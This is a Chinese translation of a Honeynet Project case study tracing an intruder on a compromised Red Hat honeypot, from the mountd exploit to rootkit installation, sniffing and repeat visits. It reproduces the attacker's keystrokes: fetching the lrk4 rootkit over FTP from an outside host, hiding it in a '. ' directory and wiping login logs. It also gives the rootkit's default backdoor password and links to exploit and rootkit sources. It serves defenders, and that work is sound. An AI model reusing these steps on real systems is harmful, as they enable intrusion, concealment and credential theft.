---
title: "了解你的敌人：III"
date: 2000-03-27T00:00:00+08:00
tags: ["Security", "Translation"]
draft: false
slug: "xfocus-honeynet-enemy3"
---

> 本文是 Honeynet Project 的"了解你的敌人：III"系列文章的中文翻译，原文发布于 [project.honeynet.org](http://project.honeynet.org/)，中文翻译来自 [xfocus.net](http://www.xfocus.net/)。

本文是对入侵者进行研究系列文章中的第三篇。[第一篇](http://www.xfocus.net/honeynet/papers/enemy/index.html)讲述了入侵者们的探测行为、分类及利用漏洞的过程，[第二篇](http://www.xfocus.net/honeynet/papers/enemy2/index.html)聚焦于如何探测这些入侵企图、鉴别他们使用了哪些工具、他们所寻找的漏洞有哪些……这篇文章，则讲述了当他们获得root权限后，所做的事情，重点放在他们是如何隐藏踪迹以及之后如何做。可以从这里下载原始数据进行分析。

**入侵者是谁**

就象我们在[第一篇](http://www.xfocus.net/honeynet/papers/enemy/index.html)文章里所说的，多数的入侵者并没有考虑太多的策略方面的问题，他们更重视的是轻易地入侵，而非针对某些特定的信息或者某个特定的公司。他们把注意力集中于最有效的几个漏洞利用程序上，然后在互联网上寻找相应的主机――迟早他们会找到适合入侵的机器的……

当他们获得root权限这后，第一件事往往是抹去他们的踪迹，他们需要确保系统管理员没有发现系统被侵袭，并且不希望留下任何日志或者他们活动的记录。然后，他们会使用你的机器来扫描网络中的其它系统，或者静静地潜伏，以求获得更多的资料。为了更好地了解他们是如何侵害系统的，我们将沿着一个入侵者的入侵步骤来观察。我们的系统――mozart，上面运行的操作系统是RedHat
5.1。系统在1999年4月27日受到攻击，下面的一些入侵过程的记录，是从系统日志及击键记录中提取的，我们对系统日志及击键都做了验证，所有的系统日志都是在一个受保护的syslog服务器上的，所有的击键都是由一个被嗅探器――称为[sniffit](http://www.xfocus.net/honeynet/papers/enemy3/sniffit.0.3.7.beta.tar.gz)捕获的。如果你想了解更多关于这些记录获得的技巧的话，请参见另一篇文章――[建立网络陷阱](http://www.xfocus.net/honeynet/papers/honeynet/)。在本文中，我们称这个入侵者为“他”――因为我们无法得知其真正的性别。

**漏洞利用**

在4月27日的00:13，有一个家伙在域名为1Cust174.tnt2.long-branch.nj.da.uu.net的地方对我们进行扫描，针对了包括imap漏洞在内的几个特定的漏洞，这些入侵者是比较讨厌的，因为他们一下扫描了整个网段，（想了解更多关于这次探测的信息，可以参见系列文章中的[第二篇](http://www.xfocus.net/honeynet/papers/enemy2/index.html)
）。

Apr 27 00:12:25 mozart imapd[939]:
connect from 208.252.226.174

Apr 27 00:12:27 bach imapd[1190]: connect from 208.252.226.174

Apr 27 00:12:30 vivaldi imapd[1225]: connect from 208.252.226.174

很显然地，他找到了一些他所乐见的东西，并且在06:52和16:47又回来了。他开始了一次针对mozart机器的彻底扫描，并且确定了这台机器存在着mountd的安全漏洞，这个漏洞是Red
Hat 5.1中存在的一个会危及root安全的漏洞，我们可以从/var/log/messages中看到，这个入侵者应该已经获得了超级用户权限，他所使用的工具看上去象是[ADMmountd.c](http://www.xfocus.net/honeynet/papers/enemy3/ADMmountd.c)或者一些极其类似的程序。

Apr 27 16:47:28 mozart mountd[306]:
Unauthorized access by NFS client 208.252.226.174.

Apr 27 16:47:28 mozart syslogd: Cannot glue message parts together

Apr 27 16:47:28 mozart mountd[306]: Blocked attempt of 208.252.226.174 to mount

~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P

~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~

在运行了这个漏洞利用程序之后，我们可以从/var/log/messages中看到，这个入侵者马上用crak0的帐号登陆，而后su成用户rewt――这两个用户都是由该漏洞利用程序添加的，现在这位入侵者对我们的系统终于拥有了最高权限了。

Apr 27 16:50:27 mozart login[1233]:
FAILED LOGIN 2 FROM 1Cust102.tnt1.long-branch.nj.da.uu.net FOR crak, User not
known to the underlying authentication module

Apr 27 16:50:38 mozart PAM_pwdb[1233]: (login) session opened for user crak0
by (uid=0)

Apr 27 16:50:38 mozart login[1233]: LOGIN ON ttyp0 BY crak0 FROM 1Cust102.tnt1.long-branch.nj.da.uu.net

Apr 27 16:50:47 mozart PAM_pwdb[1247]: (su) session opened for user rewt by
crak0(uid=0)

**抹去踪迹**

现在这个入侵者是我们系统的root了，下一步，他要确定他不会被逮到，所以他首先察看了一下是否有其它用户登陆在系统中。

```
[crak0@mozart /tmp]$ w
4:48pm up 1 day, 18:27, 1 user, load average: 0.00, 0.00, 0.00
USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
crak0 ttyp0 1Cust102.tnt1.lo 4:48pm 0.00s 0.23s 0.04s w
```

当他确定自己是安全时，他就开始准备将自己藏匿于无形了。最常见的做法是将日志文件中所有的入侵证据先擦除，并且将某些系统中的二进制程序替代为木马――比如ps和netstat，这样一般情况下系统管理员就无法发现入侵者的踪迹了。当一切就绪时，这个入侵者就可以在你几乎无法发现他的情况下，大摇大摆地对你的系统进行完全的控制了。他们用来隐藏自已踪迹的工具，一般情况下我们称之为rootkits，一个常见的rootkits就是[lrk4](http://www.xfocus.net/honeynet/papers/enemy3/lrk4.tar.gz)，通过执行它，有许多有用的程序将在一瞬间被替换以便使入侵者消失于无形。如果你想了解更多的关于rootkits的消息，可以看看lrk4的[说明文件](http://www.xfocus.net/honeynet/papers/enemy3/README.txt)。这可能会帮助你更多地了解rootkits，我还推荐你看看[hide-and-seek](http://www.xfocus.net/honeynet/papers/enemy3/hide-n-seek.html)这篇由网络黑客写的文档，应该对隐藏踪迹更有些主意。

在系统被入侵后的短短几分钟后，我们可以观察到这个入侵者下载了一个rootkit，并且运行命令"make install"完成了对它的安装，下面就是入侵者在隐藏自身时的一些击键记录。

cd /dev/

su rewt

mkdir ". "

cd ". "

ftp technotronic.com

anonymous

fdfsfdsdfssd@aol.com

cd /unix/trojans

get lrk4.unshad.tar.gz

quit

ls

tar -zxvf lrk4.unshad.tar.gz

mv lrk4 proc

mv proc ". "

cd ". "

ls

make install

注意到这个入侵者做了一件事，就是建立了一个隐藏目录". "，然后把rootkit放在这里面，这个目录不会被"ls"命令列出来，而如果运行了"ls
-la"命令的话，这个目录看起来也象是该目录自身。当然你可以通过运行"find"命令来找出它来。(当然这必须建立在你的find没有被rootkit取代的情况下)。

mozart #find / -depth -name
"*.*"

/var/lib/news/.news.daily

/var/spool/at/.SEQ

/dev/. /. /procps-1.01/proc/.depend

/dev/. /.

/dev/

这个入侵者虽然看来对装后门木马有比较丰富的经验，担对如何清除日志文件中自己的入侵记录去没啥主意，他并非利用一些清除日志的工具如zap2或者clean来做这件事，而是直接拷贝了/dev/null（这是一个设备特殊文件，为空）到/var/run/utmp及/var/log/utmp，然后删除了/var/log/wtmp，这样，如果你发现这些文件为空，或者试图打开它的时候，你会碰上错误提示：

[root@mozart sbin]# last -10

last: /var/log/wtmp:

No such file or directory

Perhaps this file was removed by the operator to prevent logging last info.

**下一步

**

现在你的系统看上去已经足够好了，入侵者往下往往会做两件事：第一，他们通过用你的机器来对网络中其它主机系统进行漏洞扫描；第二，他们希望藏得更深，并且看看他们还能从这个系统中得到什么，比如说其它用户的帐号……咱们这位入侵者选择了第二条，他在系统中安装了一个嗅探器以捕获相关的网络流量，包括telnet以及ftp的一些信息――这样他就可以获得登陆的用户名及密码，我们在/var/log/messages里看到系统在受攻击后一小段时间，网卡被置于混杂模式，以接收各种数据包了。

Apr 27 17:03:38 mozart kernel:
eth0: Setting promiscuous mode.

Apr 27 17:03:43 mozart kernel: eth0: Setting promiscuous mode.

当安装木马、清除日志以及开启嗅探器这些工作都完成后，入侵者离开了我们的系统，当然，一段时间后，他一定还会回来看看，嗅探器是否捕获到了一些有用的信息。

**事态控制**

当我们的这位朋友离开系统后，我就有机会好好检查一下系统究竟发生了什么。我对咱们被改变的文件、日志以及嗅探器得到的东西比较感兴趣，首先我用tripwire来判断哪些文件被修改或编辑的。需要确保，你通过可信的版本运行你的tripwire，我一般是用一个编译成静态的，存放于写保护软盘之上的的[tripwire](http://www.tripwire.com/)来判断的，输出如下：

```
added: -rw-r--r-- root 5 Apr 27 17:01:16 1999 /usr/sbin/sniff.pid
added: -rw-r--r-- root 272 Apr 27 17:18:09 1999 /usr/sbin/tcp.log
changed: -rws--x--x root 15588 Jun 1 05:49:22 1998 /bin/login
changed: drwxr-xr-x root 20480 Apr 10 14:44:37 1999 /usr/bin
changed: -rwxr-xr-x root 52984 Jun 10 04:49:22 1998 /usr/bin/find
changed: -r-sr-sr-x root 126600 Apr 27 11:29:18 1998 /usr/bin/passwd
changed: -r-xr-xr-x root 47604 Jun 3 16:31:57 1998 /usr/bin/top
changed: -r-xr-xr-x root 9712 May 1 01:04:46 1998 /usr/bin/killall
changed: -rws--s--x root 116352 Jun 1 20:25:47 1998 /usr/bin/chfn
changed: -rws--s--x root 115828 Jun 1 20:25:47 1998 /usr/bin/chsh
changed: drwxr-xr-x root 4096 Apr 27 17:01:16 1999 /usr/sbin
changed: -rwxr-xr-x root 137820 Jun 5 09:35:06 1998 /usr/sbin/inetd
changed: -rwxr-xr-x root 7229 Nov 26 00:02:19 1998 /usr/sbin/rpc.nfsd
changed: -rwxr-xr-x root 170460 Apr 24 00:02:19 1998 /usr/sbin/in.rshd
changed: -rwxr-x--- root 235516 Apr 4 22:11:56 1999 /usr/sbin/syslogd
changed: -rwxr-xr-x root 14140 Jun 30 14:56:36 1998 /usr/sbin/tcpd
changed: drwxr-xr-x root 2048 Apr 4 16:52:55 1999 /sbin
changed: -rwxr-xr-x root 19840 Jul 9 17:56:10 1998 /sbin/ifconfig
changed: -rw-r--r-- root 649 Apr 27 16:59:54 1999 /etc/passwd
```

正如我们所看到的，有大量的二进制文件被改动过了，其中/etc/passwd中的两个帐号crak0及rewt已经被移除，所以咱们的入侵者只能通过上面改过的东西，来实现他后门的装载。同时还有两个文件，/usr/sbin/sniff.pid有及/usr/sbin/tcp.log。这其中/usr/sbin/sniff.pid里存放的是嗅探器的pid，而/usr/sbin/tcp.log里则存放着这个入侵者所得到的所有信息。这里入侵者的嗅探器命名为rpc.nfsd――这里的嗅探器应该是linsniff，编译后替换了正常的rpc.nfsd，这样即便系统重启，我们的嗅探器一样能顺利自己启动。下面是我们对/usr/sbin/sniff.pid运行strings命令的结果选摘。

mozart #strings /usr/sbin/rpc.nfsd
| tail -15

cant get SOCK_PACKET socket

cant get flags

cant set promiscuous mode

----- [CAPLEN Exceeded]

----- [Timed Out]

----- [RST]

----- [FIN]

%s =>

%s [%d]

sniff.pid

eth0

tcp.log

cant open log

rm %s

在检查了上面这些信息之后，我决定仍将这台机器放在网络上，因为我对入侵者下一步想做什么，相当感兴趣，而且我还不能让这台honeynet有任何细微的蜘丝马迹，同时把/var/sbin/tcp.log里的数据删除。

**归去来兮**

一段日子之后，入侵者又回来了，通过记录他的击键，我们可以轻易判断出他装的后门是/bin/login，这个程序允许用户以用户名rewt密码satori来登陆――登陆便是root了，其中密码satori是rootkit
lrk4中的默认的。

他检查了他的嗅探器，以确定嗅探器现在还能正常动作，以及在过去的几天中，是否抓到了某些用户的帐号――你可以在文件[keystrokes.txt](http://www.xfocus.net/honeynet/papers/enemy3/keystrokes.txt)中找到所有的击键原始记录，在记录的后面，我们看到他将嗅探器进程杀掉后，离开系统了。但一会之后，他马上又回来了，重新开启了他的嗅探器――说实话，我不太明白他为什么这么做。

这个进程持续了很长时间，此后的四天中，这个入侵者天天都会登陆上来看一看该嗅探器是否抓到了有价值的数据。并没有做更多的事情，于是我决定将机器从网络中断开了，因为从他这里，我无法学到更多东西。

**结论**

现在我们可以从头到尾地了解了一个入侵者的侵袭过程了――当他们获得了一个系统的最高权限后，首先看看是否有其它人在线，然后他们通过一些动作来隐藏踪迹、清除日志、删除或者修改某些特定的文件，当他们认为自己安全隐藏时，他们就开始做一些对系统侵害更大的事情了。这种入侵方式最常出现在一种新的漏洞被揭示，漏洞利用程序公布的时候――这时这些入侵者需要的仅是非常简单的技巧了。因此如果你是一个系统管理员的话，我建议应该要尽量地完善你系统的安全性，基本的一些防御会使你的系统抵挡得住大多数的攻击，你可以查看[Armoring
Linux](http://www.xfocus.net/honeynet/papers/enemy3/linux.html)或者[Armoring
Solaris](http://www.xfocus.net/honeynet/papers/enemy3/armoring.html)来获得一些使主机更安全的思路。如果你感觉机器已经遭受入侵，建议你访问CERT的站点"[Recovering
from an Incident](http://www.cert.org/nav/recovering.html)"以获得帮助。
